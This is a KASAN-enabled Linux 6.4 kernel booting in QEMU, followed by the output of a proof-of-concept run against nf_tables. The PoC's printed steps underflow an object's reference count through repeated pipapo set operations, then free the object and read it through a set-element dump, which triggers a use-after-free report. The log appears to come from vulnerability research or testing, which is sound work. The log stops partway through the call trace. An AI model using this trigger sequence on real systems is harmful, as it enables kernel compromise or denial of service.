bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+BEFCEF00+BEF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004bc73a8
input_len: 0x00000000019cff19
output: 0x0000000001000000
output_len: 0x0000000005521208
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Thu May  7 19:12:31 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x00000000bffdffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000bffe0000-0x00000000bfffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000100000000-0x000000013fffffff] usable
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 447430185 cycles
[    0.001318] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.005593] tsc: Detected 2995.200 MHz processor
[    0.007721] last_pfn = 0x140000 max_arch_pfn = 0x400000000
[    0.009976] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.012793] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.015238] last_pfn = 0xbffe0 max_arch_pfn = 0x400000000
[    0.021762] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.023832] Using GB pages for direct mapping
[    0.025532] Incomplete global flushes, disabling PCID
[    0.026690] RAMDISK: [mem 0xbfe4f000-0xbffdffff]
[    0.029719] ACPI: Early table checksum verification disabled
[    0.031937] ACPI: RSDP 0x00000000000F59B0 000014 (v00 BOCHS )
[    0.033370] ACPI: RSDT 0x00000000BFFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.035355] ACPI: FACP 0x00000000BFFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.037309] ACPI: DSDT 0x00000000BFFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.039459] ACPI: FACS 0x00000000BFFE0000 000040
[    0.041154] ACPI: APIC 0x00000000BFFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.044264] ACPI: HPET 0x00000000BFFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.047735] ACPI: WAET 0x00000000BFFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.051454] ACPI: Reserving FACP table memory at [mem 0xbffe19df-0xbffe1a52]
[    0.053266] ACPI: Reserving DSDT table memory at [mem 0xbffe0040-0xbffe19de]
[    0.055032] ACPI: Reserving FACS table memory at [mem 0xbffe0000-0xbffe003f]
[    0.056933] ACPI: Reserving APIC table memory at [mem 0xbffe1a53-0xbffe1ad2]
[    0.059296] ACPI: Reserving HPET table memory at [mem 0xbffe1ad3-0xbffe1b0a]
[    0.061549] ACPI: Reserving WAET table memory at [mem 0xbffe1b0b-0xbffe1b32]
[    0.064102] No NUMA configuration found
[    0.065274] Faking a node at [mem 0x0000000000000000-0x000000013fffffff]
[    0.067536] NODE_DATA(0) allocated [mem 0x13fffa000-0x13fffdfff]
[    0.069356] Zone ranges:
[    0.070184]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.072834]   DMA32    [mem 0x0000000001000000-0x00000000ffffffff]
[    0.074229]   Normal   [mem 0x0000000100000000-0x000000013fffffff]
[    0.076265] Movable zone start for each node
[    0.077515] Early memory node ranges
[    0.078489]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.080226]   node   0: [mem 0x0000000000100000-0x00000000bffdffff]
[    0.081797]   node   0: [mem 0x0000000100000000-0x000000013fffffff]
[    0.083462] Initmem setup node 0 [mem 0x0000000000001000-0x000000013fffffff]
[    0.086338] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.086397] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.121826] On node 0, zone Normal: 32 pages in unavailable ranges
[    0.335832] kasan: KernelAddressSanitizer initialized
[    0.339339] ACPI: PM-Timer IO Port: 0x608
[    0.340360] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.342483] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.345391] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.347535] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.349295] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.350914] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.352617] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.354363] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.356514] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.358315] TSC deadline timer available
[    0.359826] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.361202] kvm-guest: KVM setup pv remote TLB flush
[    0.362649] kvm-guest: setup PV sched yield
[    0.363830] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.365802] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.367867] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.369836] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.371831] PM: hibernation: Registered nosave memory: [mem 0xbffe0000-0xbfffffff]
[    0.373829] PM: hibernation: Registered nosave memory: [mem 0xc0000000-0xfeffbfff]
[    0.375980] PM: hibernation: Registered nosave memory: [mem 0xfeffc000-0xfeffffff]
[    0.378015] PM: hibernation: Registered nosave memory: [mem 0xff000000-0xfffbffff]
[    0.380038] PM: hibernation: Registered nosave memory: [mem 0xfffc0000-0xffffffff]
[    0.382140] [mem 0xc0000000-0xfeffbfff] available for PCI devices
[    0.383680] Booting paravirtualized kernel on KVM
[    0.384895] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.397938] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.400734] percpu: Embedded 66 pages/cpu s232168 r8192 d29976 u1048576
[    0.402489] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.404748] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.407053] random: crng init done
[    0.409881] Dentry cache hash table entries: 524288 (order: 10, 4194304 bytes, linear)
[    0.412903] Inode-cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.415177] Fallback order for Node 0: 0 
[    0.415181] Built 1 zonelists, mobility grouping on.  Total pages: 1031904
[    0.417472] Policy zone: Normal
[    0.418167] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.419612] stackdepot: allocating hash table via alloc_large_system_hash
[    0.424515] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.426235] software IO TLB: area num 2.
[    0.494243] Memory: 3425548K/4193784K available (49152K kernel code, 7946K rwdata, 10072K rodata, 5644K init, 2948K bss, 767980K reserved, 0K cma-reserved)
[    0.498335] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.501331] Dynamic Preempt: voluntary
[    0.502972] rcu: Preemptible hierarchical RCU implementation.
[    0.504224] rcu: 	RCU event tracing is enabled.
[    0.505225] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.506873] 	Trampoline variant of Tasks RCU enabled.
[    0.508469] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.510645] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.520655] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.522146] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.531620] Console: colour VGA+ 80x25
[    0.533028] printk: console [ttyS0] enabled
[    0.533028] printk: console [ttyS0] enabled
[    0.534849] printk: bootconsole [earlyser0] disabled
[    0.534849] printk: bootconsole [earlyser0] disabled
[    0.537038] ACPI: Core revision 20230331
[    0.538171] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.540219] APIC: Switch to symmetric I/O mode setup
[    0.541035] kvm-guest: setup PV IPIs
[    0.543838] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.545603] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.548700] Calibrating delay loop (skipped) preset value.. 5990.40 BogoMIPS (lpj=2995200)
[    0.550173] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.551905] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.553697] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.554717] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.555703] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.556698] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.557698] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.558698] RETBleed: Mitigation: Enhanced IBRS
[    0.559700] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.560699] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.561698] MMIO Stale Data: Unknown: No mitigations
[    0.562737] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.563697] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.564698] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.565699] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.566698] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.584818] Freeing SMP alternatives memory: 44K
[    0.585699] pid_max: default: 32768 minimum: 301
[    0.586765] LSM: initializing lsm=capability,selinux,integrity
[    0.587716] SELinux:  Initializing.
[    0.588781] Mount-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    0.589703] Mountpoint-cache hash table entries: 8192 (order: 4, 65536 bytes, linear)
[    0.591803] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.592898] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.593744] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.594754] signal: max sigframe size: 1776
[    0.595761] rcu: Hierarchical SRCU implementation.
[    0.596702] rcu: 	Max phase no-delay instances is 400.
[    0.598146] smp: Bringing up secondary CPUs ...
[    0.598932] smpboot: x86: Booting SMP configuration:
[    0.599702] .... node  #0, CPUs:      #1
[    0.600788] smp: Brought up 1 node, 2 CPUs
[    0.602704] smpboot: Max logical packages: 1
[    0.603704] smpboot: Total of 2 processors activated (11980.80 BogoMIPS)
[    0.605769] devtmpfs: initialized
[    0.608835] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.609705] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.610927] PM: RTC time: 19:13:05, date: 2026-05-07
[    0.611886] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.612936] audit: initializing netlink subsys (disabled)
[    0.614734] audit: type=2000 audit(1778181185.699:1): state=initialized audit_enabled=0 res=1
[    0.614952] thermal_sys: Registered thermal governor 'step_wise'
[    0.615706] thermal_sys: Registered thermal governor 'user_space'
[    0.616729] cpuidle: using governor menu
[    0.619008] PCI: Using configuration type 1 for base access
[    0.619888] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.622884] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.624704] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.626895] ACPI: Added _OSI(Module Device)
[    0.627703] ACPI: Added _OSI(Processor Device)
[    0.628701] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.629700] ACPI: Added _OSI(Processor Aggregator Device)
[    0.637900] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.695857] ACPI: Interpreter enabled
[    0.696747] ACPI: PM: (supports S0 S3 S4 S5)
[    0.697722] ACPI: Using IOAPIC for interrupt routing
[    0.698960] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.699733] PCI: Using E820 reservations for host bridge windows
[    0.701414] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.716281] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.716722] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.717705] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.718775] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.719918] PCI host bridge to bus 0000:00
[    0.720705] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.721708] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.722708] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.723709] pci_bus 0000:00: root bus resource [mem 0xc0000000-0xfebfffff window]
[    0.724718] pci_bus 0000:00: root bus resource [mem 0x140000000-0x1bfffffff window]
[    0.725710] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.726812] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.733297] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.739272] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.741403] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.742469] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.742702] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.743701] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.744704] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.746041] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.747654] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.747720] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.749169] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.750769] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.753153] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.757122] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.757990] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.764000] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.765704] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.767614] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.771393] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.779309] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.780249] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.781214] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.782539] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.782935] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.785548] iommu: Default domain type: Translated 
[    0.785703] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.786975] SCSI subsystem initialized
[    0.787853] ACPI: bus type USB registered
[    0.788741] usbcore: registered new interface driver usbfs
[    0.789720] usbcore: registered new interface driver hub
[    0.790717] usbcore: registered new device driver usb
[    0.791745] pps_core: LinuxPPS API ver. 1 registered
[    0.793701] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.796724] PTP clock support registered
[    0.797799] Advanced Linux Sound Architecture Driver Initialized.
[    0.800198] NetLabel: Initializing
[    0.801711] NetLabel:  domain hash size = 128
[    0.803704] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.805752] NetLabel:  unlabeled traffic allowed by default
[    0.806761] PCI: Using ACPI for IRQ routing
[    0.807948] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.808695] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.808695] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.812704] vgaarb: loaded
[    0.813724] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.814704] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.820773] clocksource: Switched to clocksource kvm-clock
[    0.857553] VFS: Disk quotas dquot_6.6.0
[    0.858803] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.860541] pnp: PnP ACPI init
[    0.862732] pnp: PnP ACPI: found 6 devices
[    0.876322] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.879016] NET: Registered PF_INET protocol family
[    0.881128] IP idents hash table entries: 65536 (order: 7, 524288 bytes, linear)
[    0.883770] tcp_listen_portaddr_hash hash table entries: 2048 (order: 3, 32768 bytes, linear)
[    0.885837] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.888882] TCP established hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.892071] TCP bind hash table entries: 32768 (order: 8, 1048576 bytes, linear)
[    0.895944] TCP: Hash tables configured (established 32768 bind 32768)
[    0.897555] UDP hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    0.899177] UDP-Lite hash table entries: 2048 (order: 4, 65536 bytes, linear)
[    0.902766] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.904523] RPC: Registered named UNIX socket transport module.
[    0.905907] RPC: Registered udp transport module.
[    0.907010] RPC: Registered tcp transport module.
[    0.908108] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.910193] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.911695] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.913220] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.915676] pci_bus 0000:00: resource 7 [mem 0xc0000000-0xfebfffff window]
[    0.918157] pci_bus 0000:00: resource 8 [mem 0x140000000-0x1bfffffff window]
[    0.920521] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.921993] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.923713] PCI: CLS 0 bytes, default 64
[    0.924731] PCI-DMA: Using software bounce buffering for IO (SWIOTLB)
[    0.924900] Unpacking initramfs...
[    0.926349] software IO TLB: mapped [mem 0x00000000bbe4f000-0x00000000bfe4f000] (64MB)
[    0.931210] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.933392] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8ec87c7, max_idle_ns: 440795278598 ns
[    0.938336] Initialise system trusted keyrings
[    0.939244] workingset: timestamp_bits=56 max_order=20 bucket_order=0
[    0.942369] NFS: Registering the id_resolver key type
[    0.943620] Key type id_resolver registered
[    0.944654] Key type id_legacy registered
[    0.945684] 9p: Installing v9fs 9p2000 file system support
[    0.954186] Key type asymmetric registered
[    0.955874] Asymmetric key parser 'x509' registered
[    0.956697] Freeing initrd memory: 1604K
[    0.957970] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.961253] io scheduler mq-deadline registered
[    0.962363] io scheduler kyber registered
[    0.963574] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.965599] ACPI: button: Power Button [PWRF]
[    0.967145] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.968890] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.972030] Non-volatile memory driver v1.3
[    0.973030] Linux agpgart interface v0.103
[    0.974207] ACPI: bus type drm_connector registered
[    0.978893] loop: module loaded
[    0.981486] scsi host0: ata_piix
[    0.982677] scsi host1: ata_piix
[    0.983562] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.985077] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.987135] e100: Intel(R) PRO/100 Network Driver
[    0.988495] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.990087] e1000: Intel(R) PRO/1000 Network Driver
[    0.991409] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.141281] ata2: found unknown device (class 0)
[    1.143261] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.146339] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.165318] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    1.166819] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.403027] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.754387] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.757922] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.759493] e1000e: Intel(R) PRO/1000 Network Driver
[    1.760617] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.761975] sky2: driver version 1.30
[    1.763389] usbcore: registered new interface driver usblp
[    1.764663] usbcore: registered new interface driver usb-storage
[    1.766074] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.769142] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.770265] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.772151] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.772406] rtc_cmos 00:05: RTC can wake from S4
[    1.777788] rtc_cmos 00:05: registered as rtc0
[    1.779467] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.782123] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    1.784075] intel_pstate: CPU model not supported
[    1.785272] hid: raw HID events driver (C) Jiri Kosina
[    1.786860] usbcore: registered new interface driver usbhid
[    1.788157] usbhid: USB HID core driver
[    1.790979] Initializing XFRM netlink socket
[    1.792219] NET: Registered PF_INET6 protocol family
[    1.794119] Segment Routing with IPv6
[    1.795045] In-situ OAM (IOAM) with IPv6
[    1.795990] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.797787] NET: Registered PF_PACKET protocol family
[    1.799025] 9pnet: Installing 9P2000 support
[    1.800056] Key type dns_resolver registered
[    1.801665] IPI shorthand broadcast: enabled
[    1.816666] sched_clock: Marking stable (1795216026, 21283400)->(1922894377, -106394951)
[    1.818907] registered taskstats version 1
[    1.819955] Loading compiled-in X.509 certificates
[    1.827997] PM:   Magic number: 10:702:242
[    1.829142] printk: console [netcon0] enabled
[    1.830228] netconsole: network logging started
[    1.831499] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.833861] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    1.835371] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.836823] ALSA device list:
[    1.837576]   No soundcards found.
[    1.839608] Freeing unused kernel image (initmem) memory: 5644K
[    1.840751] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.842196] cfg80211: failed to load regulatory.db
[    1.844441] Write protecting the kernel read-only data: 59392k
[    1.845537] Freeing unused kernel image (rodata/data gap) memory: 168K
[    1.856191] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.857183] Run /init as init process
[    1.860493] mount (55) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
[*] batch 1: NEWTABLE t1
[*] batch 2: NEWOBJ victim_obj + NEWSET s_ref + 16 x NEWSETELEM (victim_obj->use = 16)
[*] primitive 1/16: tmp_0..15 (pipapo NEWSET+NEWSETELEM committed, then DELSETELEM+DELSET — net -1 on victim_obj->use)
[*] DELOBJ victim_obj (victim_obj->use==0 -> allowed; kfree on commit)
[*] GETSETELEM s_ref dump (each elem reads (*nft_set_ext_obj(ext))->key.name)
[    2.386677] ==================================================================
[    2.388141] BUG: KASAN: slab-use-after-free in nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    2.390076] Read of size 8 at addr ffff888103b6b020 by task poc/61
[    2.391458] 
[    2.391802] CPU: 1 PID: 61 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    2.393368] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    2.395442] Call Trace:
[    2.395927]  <TASK>
[    2.396941]  dump_stack_lvl+0x36/0x50
[    2.398226]  print_report+0xcf/0x660
[    2.398820]  ? nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    2.399465]  kasan_report+0xc7/0x100
[    2.399918]  ? nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    2.400549]  nf_tables_fill_setelem.isra.0+0xe3f/0xf10
[    2.401659]  ? _raw_spin_lock+0x80/0xe0
[    2.402478]  ? __pfx_nf_tables_fill_setelem.isra.0+0x10/0x10
[    2.403464]  ? __pfx__raw_spin_lock+0x10/0x10
[    2.404249]  ? get_page_from_freelist+0x1a57/0x30a0
[    2.405339]  ? rhashtable_walk_start_check+0x13e/0x760
[    2.406135]  nft_rhash_walk+0x23e/0x4a0
[    2.406691]  ? __netlink_dump_start+0x661/0xa40
[    2.407406]  ? nf_tables_getsetelem+0x7ad/0xab0
[    2.408104]  ? nfnetlink_rcv_msg+0x456/0x8b0
[    2.408809]  ? __pfx_nft_rhash_walk+0x10/0x10
[    2.409477]  ? netlink_sendmsg+0x7b7/0xc60
[    2.410053]  nf_tables_dump_set+0x8a5/0xdd0
[    2.410653]  ? __pfx_nf_tables_dump_set+0x10/0x10
[    2.411201]  ? __alloc_skb+0x10d/0x280
[    2.411690]  ? __pfx_nf_tables_dump_setelem+0x10/0x10
[    2.412317]  ? __pfx_mutex_lock+0x10/0x10
[    2.412923]  netlink_dump+0x4fe/0x1070
[    2.413382]  ? __pfx_netlink_dump+0x10/0x10
[    2.414001]  ? __kasan_kmalloc+0x8f/0xa0
[    2.414605]  ? mutex_unlock+0x7f/0xd0
[    2.415171]  ? __pfx_mutex_unlock+0x10/0x10
[    2.415797]  __netlink_dump_start+0x661/0xa40
[    2.416443]  nf_tables_getsetelem+0x7ad/0xab0
[    2.417128]  ? __pfx_nf_tables_getsetelem+0x10/0x10
[    2.417857]  ? __pfx_nf_tables_dump_set_start+0x10/0x10
[    2.418648]  ? __pfx_nf_tables_dump_set+0x10/0x10
[    2.419452]  ? __pfx_nf_tables_dump_set_done+0x10/0x10
[    2.420541]  ? __pfx___nla_validate_parse+0x10/0x10
[    2.421087]  ? unwind_next_frame+0xc3e/0x2440
[    2.421562]  ? arch_stack_walk+0x74/0x100
[    2.422381]  nfnetlink_rcv_msg+0x456/0x8b0
[    2.423109]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[    2.424116]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    2.425028]  ? kasan_save_stack+0x43/0x60
[    2.425761]  ? kasan_save_stack+0x33/0x60
[    2.426456]  ? kasan_set_track+0x25/0x30
[    2.427194]  ? __kasan_slab_alloc+0x6e/0x70
[    2.428021]  ? kmem_cache_alloc_node+0x110/0x280
[    2.428659]  ? kmalloc_reserve+0x110/0x1e0
